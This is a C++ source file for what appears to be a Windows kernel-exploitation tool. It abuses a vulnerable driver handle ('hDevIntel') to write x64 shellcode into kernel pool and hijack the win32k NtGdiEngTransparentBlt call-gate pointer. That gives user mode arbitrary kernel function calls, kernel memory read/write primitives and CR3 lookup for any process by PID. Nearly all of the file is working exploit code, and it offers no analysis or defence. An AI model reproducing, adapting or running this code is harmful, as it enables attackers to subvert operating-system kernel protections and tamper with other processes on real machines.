#include <inc.h>

unsigned char ring0_exec::shellcode[] =
{
	/*  0*/																// <R0_CallG_RIP_GATE>:
	/*  0*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs rax,0x1122334455667788		// Magic
	/* 10*/ 0x48, 0x39, 0xC1,											// cmp    rcx,rax
	/* 13*/ 0x74, 0x0C,													// je     +12 <is_hooked_thread>		// 15 + 12 = 27
	/* 15*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs rax,0x1122334455667788		// R0_NtBlt_RIP_GATE
	/* 25*/ 0xFF, 0xE0,													// jmp    rax
	/* 27*/																// <is_hooked_thread>:
	/* 27*/ 0x55,														// push   rbp
	/* 28*/ 0x48, 0x89, 0xE5,											// mov    rbp,rsp
	/* 31*/ 0x48, 0x89, 0x4D, 0x10,										// mov    QWORD PTR [rbp+0x10],rcx
	/* 35*/ 0x48, 0x89, 0x55, 0x18,										// mov    QWORD PTR [rbp+0x18],rdx
	/* 39*/ 0x4C, 0x89, 0x45, 0x20,										// mov    QWORD PTR [rbp+0x20],r8
	/* 43*/ 0x4C, 0x89, 0x4D, 0x28,										// mov    QWORD PTR [rbp+0x28],r9
	/* 47*/ 0x48, 0x89, 0xD0,											// mov    rax,rdx
	/* 50*/ 0x4C, 0x89, 0xC1,											// mov    rcx,r8
	/* 53*/ 0x4C, 0x89, 0xCA,											// mov    rdx,r9
	/* 56*/ 0x4C, 0x8B, 0x45, 0x30,										// mov    r8,QWORD PTR [rbp+0x30]
	/* 60*/ 0x4C, 0x8B, 0x4D, 0x38,										// mov    r9,QWORD PTR [rbp+0x38]
	/* 64*/ 0xFF, 0x75, 0x40,											// push   QWORD PTR [rbp+0x40]			// push
	/* 67*/ 0xFF, 0x75, 0x48,											// push   QWORD PTR [rbp+0x48]			// push
	/* 70*/ 0x48, 0x83, 0xEC, 0x20,										// sub    rsp,0x20						// 0x20
	/* 74*/ 0xFF, 0xD0,													// call   rax							// ret
	/* 76*/ 0x48, 0x89, 0xEC,											// mov    rsp, rbp
	/* 79*/ 0x5D,														// pop    rbp
	/* 80*/ 0xC3,														// ret
	/* 81*/																// <unhookself>:
	/* 81*/ 0x48, 0x83, 0xC4, 0x38,										// add    rsp,0x38						// ret + 0x20 + push + push
	/* 85*/ 0x48, 0x89, 0xEC,											// mov    rsp,rbp
	/* 88*/ 0x5D,														// pop    rbp
	/* 89*/ 0x48, 0x8B, 0x05, 0xB1, 0xFF, 0xFF, 0xFF,					// mov    rax,QWORD PTR [rip-96+15+2]	// 96 - (15 + 2) = 79 (R0_NtBlt_RIP_GATE)
	/* 96*/ 0x48, 0xA3, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// movabs ds:0x1122334455667788,rax		// R0_NtBlt_RIP_GATE_PTR
	/*106*/ 0x48, 0x8D, 0x0D, 0x8F, 0xFF, 0xFF, 0xFF,					// lea    rcx,QWORD PTR [rip-113]		// R0_CallG_RIP_GATE
	/*113*/ 0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,	// mov    rax,0x1122334455667788		// ExFreePool
	/*123*/ 0xFF, 0xE0,													// jmp    rax
};

// ULONG64 shellcode_get_qword(PVOID A)
unsigned char ring0_exec::shellcode_get_qword[] = { 0x48, 0x8B, 0x01, 0xC3 };
/*
0:  48 8b 01                mov    rax,QWORD PTR [rcx]
3:  c3                      ret
 */

 // ULONG64 shellcode_set_qword(PVOID A, ULONG64 v)
unsigned char ring0_exec::shellcode_set_qword[] = { 0x48, 0x89, 0x11, 0xC3 };
/*
0:  48 89 11                mov    QWORD PTR [rcx],rdx
3:  c3                      ret
 */

ring0_exec::ring0_exec(
	const decltype(R3_GetModuleHandleA) get_module_handle_a,
	const decltype(R3_GetProcAddress) get_proc_address,
	const decltype(hDevIntel) handle,
	const decltype(R3_GetKernelModuleAddress) get_kernel_module_address,
	const decltype(DRV_GetKernelModuleExport) get_kernel_module_export,
	const decltype(DRV_ReadMemory) read_memory,
	const decltype(DRV_WriteMemory) write_memory,
	const decltype(DRV_AllocatePool) allocate_pool)
	:
	R3_GetModuleHandleA(get_module_handle_a),
	R3_GetProcAddress(get_proc_address),
	hDevIntel(handle),
	R3_GetKernelModuleAddress(get_kernel_module_address),
	DRV_GetKernelModuleExport(get_kernel_module_export),
	DRV_ReadMemory(read_memory),
	DRV_WriteMemory(write_memory),
	DRV_AllocatePool(allocate_pool)
{
	printf("[+] " __FUNCTION__"\n");
	// Find win32u.dll Modul-Base
	const auto R3_win32u = this->R3_GetModuleHandleA("win32u.dll");
	std::cout << "    "; PRINTVAR(R3_win32u, "%p");
	// Find NtGdiEngTransparentBlt
	this->R3_syscall = reinterpret_cast<uintptr_t>(this->R3_GetProcAddress(R3_win32u, "NtGdiEngTransparentBlt"));
	// Find win32k.sys Modul-Base
	const auto R0_win32k = reinterpret_cast<void*>(this->R3_GetKernelModuleAddress("win32k.sys"));
	// Calculate NtGdiEngTransparentBlt Address
	const auto R0_NtBlt = ptr_field(offset::_PUBLIC::NtGdiEngTransparentBlt, R0_win32k);
	// Calculate Callgate-Address-Calculation-RIP
	const auto R0_NtGdiEngTransparentBlt_RIP = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_Rip, R0_NtBlt);
	// Calculate Callgate RIP Offset-Pointer
	const auto R0_NtBlt_RIP_GATE_OFFSET_PTR = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate, R0_NtBlt);
	// Readback Callgate RIP Offset
	this->DRV_ReadMemory(this->hDevIntel,
		R0_NtBlt_RIP_GATE_OFFSET_PTR, static_cast<void*>(&this->R0_NtBlt_RIP_GATE_OFFSET),
		min(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate.bytes, sizeof(this->R0_NtBlt_RIP_GATE_OFFSET)));
	// Calculate Callgate-Pointer Address
	this->R0_NtBlt_RIP_GATE_PTR = R0_NtGdiEngTransparentBlt_RIP + this->R0_NtBlt_RIP_GATE_OFFSET;
	// Readback Callgate-Pointer
	this->DRV_ReadMemory(this->hDevIntel, this->R0_NtBlt_RIP_GATE_PTR, static_cast<void*>(&this->R0_NtBlt_RIP_GATE), sizeof(this->R0_NtBlt_RIP_GATE));
	// Allocate Kernel-Memory
	this->R0_CallG_RIP_GATE = this->DRV_AllocatePool(this->hDevIntel, nt::POOL_TYPE::NonPagedPool, sizeof(ring0_exec::shellcode));
	this->R0_Fnc_UnhookSelf = this->R0_CallG_RIP_GATE + ring0_exec::R0_O_unhookself;
	// Find ntoskrnl.exe Modul-Base
	this->R0_ntoskrnl = this->R3_GetKernelModuleAddress("ntoskrnl.exe");
	// Find ExFreePool
	this->R0_ExFreePool = this->DRV_GetKernelModuleExport(this->hDevIntel, this->R0_ntoskrnl, "ExFreePool");
	// Edit Shellcode
	memcpy(&ring0_exec::shellcode[R0_Callgate_Mag], &ring0_exec::magic, sizeof(ring0_exec::magic));
	memcpy(&ring0_exec::shellcode[R0_Callgate_Org], &this->R0_NtBlt_RIP_GATE, sizeof(this->R0_NtBlt_RIP_GATE));
	memcpy(&ring0_exec::shellcode[R0_Callgate_Ptr], &this->R0_NtBlt_RIP_GATE_PTR, sizeof(this->R0_NtBlt_RIP_GATE_PTR));
	memcpy(&ring0_exec::shellcode[R0_P_ExFreePool], &this->R0_ExFreePool, sizeof(this->R0_ExFreePool));
	// Write Shellcode to allocated Kernel-Memory
	this->DRV_WriteMemory(this->hDevIntel, R0_CallG_RIP_GATE, ring0_exec::shellcode, sizeof(ring0_exec::shellcode));
	// Overwrite Callgate-Pointer with Shellcode-Address
	this->DRV_WriteMemory(this->hDevIntel, this->R0_NtBlt_RIP_GATE_PTR, static_cast<void*>(&this->R0_CallG_RIP_GATE), sizeof(uint64_t));
	ring0_exec::is_hooked = true;
	// Find RtlCopyMemory
	this->R0_RtlCopyMemory = this->DRV_GetKernelModuleExport(this->hDevIntel, this->R0_ntoskrnl, "RtlCopyMemory");
	// Find ExAllocatePool
	this->R0_ExAllocatePool = this->_GetKernelModuleExport(this->R0_ntoskrnl, "ExAllocatePool");

	// ---
	
	this->r0_SC_GET_QWORD = this->_ExAllocatePool(static_cast<unsigned long long>(nt::POOL_TYPE::NonPagedPool), sizeof(shellcode_get_qword) + sizeof(shellcode_set_qword));
	this->r0_SC_SET_QWORD = reinterpret_cast<PVOID>(reinterpret_cast<ULONG64>(this->r0_SC_GET_QWORD) + sizeof(shellcode_get_qword));
	this->_RtlCopyMemory(this->r0_SC_GET_QWORD, shellcode_get_qword, sizeof(shellcode_get_qword));
	this->_RtlCopyMemory(this->r0_SC_SET_QWORD, shellcode_set_qword, sizeof(shellcode_set_qword));

	// ---

	this->r0_PsLookupProcessByProcessId = this->_GetKernelModuleExport(this->R0_ntoskrnl, "PsLookupProcessByProcessId");
	this->r0_ObDereferenceObject = this->_GetKernelModuleExport(this->R0_ntoskrnl, "ObDereferenceObject");
}

intptr_t ring0_exec::call(
	const intptr_t ptr,
	const int64_t rcx, const int64_t rdx,
	const int64_t  r8, const int64_t  r9,
	const long p5, const long p6) const
{
	return reinterpret_cast<intptr_t(*)(
		int64_t p1, int64_t p2, int64_t p3, int64_t p4,
		int64_t p5, int64_t p6, int32_t p7, int32_t p8)>
		(this->R3_syscall)(
			ring0_exec::magic,
			ptr,
			rcx, rdx, r8, r9, p5, p6);
}

PVOID ring0_exec::_RtlCopyMemory(void* Dest, const void* Src, const size_t Size) const
{
	return reinterpret_cast<PVOID>(this->call(
		this->R0_RtlCopyMemory,
		reinterpret_cast<int64_t>(Dest),
		reinterpret_cast<int64_t>(Src),
		Size));
}

uint64_t ring0_exec::_GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) const
{
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	this->_RtlCopyMemory(&dos_header, reinterpret_cast<PVOID>(kernel_module_base), sizeof(dos_header));
	if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
	
	this->_RtlCopyMemory(&nt_headers, reinterpret_cast<PVOID>(kernel_module_base + dos_header.e_lfanew), sizeof(nt_headers));
	if (nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = static_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	this->_RtlCopyMemory(export_data, reinterpret_cast<PVOID>(kernel_module_base + export_base), export_base_size);

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

PVOID ring0_exec::_ExAllocatePool(const unsigned long long PoolType, const SIZE_T NumberOfBytes) const
{
	return reinterpret_cast<PVOID>(this->call(
		this->R0_ExAllocatePool,
		PoolType,
		NumberOfBytes));
}

void ring0_exec::_ExFreePool(PVOID P) const
{
	this->call(
		this->R0_ExFreePool,
		reinterpret_cast<int64_t>(P));
}

ULONG64 ring0_exec::G_R0_QWORD(const ULONG64 VA) const
{
	return this->call(reinterpret_cast<ULONG64>(this->r0_SC_GET_QWORD), VA);
}

void ring0_exec::S_R0_QWORD(const ULONG64 VA, const ULONG64 var) const
{
	this->call(reinterpret_cast<ULONG64>(this->r0_SC_SET_QWORD), VA, var);
}

ULONG64 ring0_exec::GetCR3ByEprocess(const PVOID pEProc) const
{
	if (pEProc == nullptr)
		return 0;

	const auto r0_pKProc = offset::ptr_field(offset::_EPROCESS::Pcb, pEProc);
	const auto r0_pDirectoryTableBase = offset::ptr_field(offset::_KPROCESS::DirectoryTableBase, r0_pKProc);
	auto DirectoryTableBase = 0ui64;
	this->_RtlCopyMemory(&DirectoryTableBase, r0_pDirectoryTableBase, sizeof(DirectoryTableBase));

	return DirectoryTableBase;
}
PVOID ring0_exec::GetEProcessByPID(const ULONG64 PID) const
{
	//check pid
	if (PID == 0) return nullptr;
	//get eprocess
	auto r0_ppEProc = this->_ExAllocatePool(static_cast<unsigned long long>(nt::POOL_TYPE::NonPagedPool), sizeof(PVOID));
	if (!NT_SUCCESS(static_cast<NTSTATUS>(this->call(
		this->r0_PsLookupProcessByProcessId,
		PID,
		reinterpret_cast<long long>(r0_ppEProc)))))
	{
		this->_ExFreePool(r0_ppEProc);
		return nullptr;
	}
	PVOID pEProc = nullptr;
	this->_RtlCopyMemory(&pEProc, r0_ppEProc, sizeof(PVOID));
	//dereference
	if (pEProc != nullptr)
	{
		this->call(this->r0_ObDereferenceObject, reinterpret_cast<long long>(pEProc));
	}
	this->_ExFreePool(r0_ppEProc);
	return pEProc;
}

ULONG64 ring0_exec::GetCR3ByPID(const ULONG64 PID) const
{
	return this->GetCR3ByEprocess(this->GetEProcessByPID(PID));
}

ring0_exec::~ring0_exec()
{
	printf("[-] " __FUNCTION__"\n");

	this->_ExFreePool(this->r0_SC_GET_QWORD);

	// ---
	
	this->call(this->R0_Fnc_UnhookSelf);
	ring0_exec::is_hooked = false;
};